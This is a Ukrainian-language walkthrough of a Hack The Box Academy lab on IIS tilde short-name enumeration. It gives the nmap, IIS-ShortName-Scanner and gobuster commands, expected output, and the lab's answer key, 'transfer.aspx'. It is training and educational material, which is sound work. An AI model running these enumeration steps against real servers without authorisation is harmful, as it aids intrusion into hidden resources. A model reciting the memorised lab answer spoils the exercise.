Attacking Common Applications — IIS Tilde Enumeration
=====================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [IIS Tilde Enumeration](https://academy.hackthebox.com/app/module/113/section/2152)
Ціль: `10.129.107.252`
Фінальна відповідь: `transfer.aspx`

Ідея атаки
----------

Маємо IIS 7.5 на порту 80, який:
- підтримує 8.3 short‑names для файлів/директорій;
- вразливий до tilde‑enumeration (`~` + числовий суфікс);
- дозволяє через `IIS-ShortName-Scanner` знайти short‑імʼя файлу (`TRANSF~1.ASP`);
- далі через таргетований словник + `gobuster` добиваємо повне імʼя `.aspx` файлу (`transfer.aspx`).

Крок 1 — Nmap (відкриті порти)
-------------------------------

```bash
nmap -p- -sV -sC --open 10.129.107.252
```

Результат:

- `80/tcp open  http  Microsoft IIS httpd 7.5`
- `http-title: Bounty`
- OS: Windows (IIS 7.5).

Висновок: працюємо по HTTP 80, запускаємо tilde‑enumeration/short‑name‑атаки.

Крок 2 — Підготувати IIS-ShortName-Scanner
------------------------------------------

Клонуємо репозиторій:

```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
cd IIS-ShortName-Scanner
```

Далі за README: `jar` лежить у каталозі `release`.

```bash
cd release
ls
# має бути файл iis_shortname_scanner.jar
```

Запускаємо сканер на ціль:

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.107.252/
```

- `0` — показує тільки фінальний результат;
- `5` — кількість потоків;
- URL — корінь сайту. [academy:2]

Приклад очікуваного виводу:

```text
Result: Vulnerable!
Used HTTP method: OPTIONS
Suffix (magic part): /~1/
Identified directories: 2
  ASPNET~1
  UPLOAD~1
Identified files: 3
  CSASPX~1.CS
  CSASPX~1.CS??
  TRANSF~1.ASP
```

Важливо:

- short‑імʼя `TRANSF~1.ASP` відповідає якійсь `.aspx/.asp` сторінці, але прямий `GET` блокується;
- треба «вгадати» повне імʼя через словник.

Крок 3 — Створюємо кастомний wordlist під `transf`
--------------------------------------------------

На атакуючій машині:

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Команда робить:

- знаходить усі слова, які починаються на `transf` у стандартних wordlists;
- обрізає імʼя файлу, залишаючи тільки слово;
- зберігає результати в `/tmp/list.txt`.

Логіка:

- short‑імʼя `TRANSF~1.ASP` → початок `transf`;
- повне імʼя майже точно виглядає як `transfer`, `transfile`, `transferlist`, тощо;
- ми не фузимо весь інтернет, а тільки `transf*`.

Крок 4 — Gobuster по словнику
------------------------------

Запускаємо `gobuster`:

```bash
gobuster dir -u http://10.129.107.252/ -w /tmp/list.txt -x .aspx,.asp
```

Опції:

- `-u` — URL;
- `-w` — наш wordlist `/tmp/list.txt`;
- `-x .aspx,.asp` — розширення, які нас цікавлять (бо short‑імʼя закінчується на `.ASP`).

Очікуваний результат:

```text
/transfer.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
```

Тут:

- `transfer.aspx` — **повне** імʼя файлу, який відповідає short‑name `TRANSF~1.ASP`;
- status `200` означає, що файл реально існує і доступний.

Крок 5 — Фіксуємо відповідь та нотатки
--------------------------------------

Записуємо для себе/репорту:

- IIS 7.5 на `10.129.107.252` вразливий до tilde/8.3 short‑name enumeration;
- `IIS-ShortName-Scanner` дав short‑імʼя `TRANSF~1.ASP`;
- через таргетований словник (`transf*`) і `gobuster` знайдено повну назву файлу `/transfer.aspx`.

Відповідь
---------

**Q1:** What is the full .aspx filename that Gobuster identified?  
**A:** `transfer.aspx`.

Що тут було вразливим
---------------------

- IIS 7.5 з увімкненими 8.3 short‑names (`NtfsDisable8dot3NameCreation=0`), що дає можливість по `~` розкривати приховані ресурси. [web:1]
- Використання OPTIONS/GET‑патернів із `IIS-ShortName-Scanner` дозволяє знайти short‑імʼя файлів і директорій (у нашому випадку `TRANSF~1.ASP`). [web:1][academy:2]
- Через словники і `gobuster` з short‑імʼя витягуються повні назви файлів (`transfer.aspx`), що може давати доступ до прихованих/адмінських ендпоінтів.
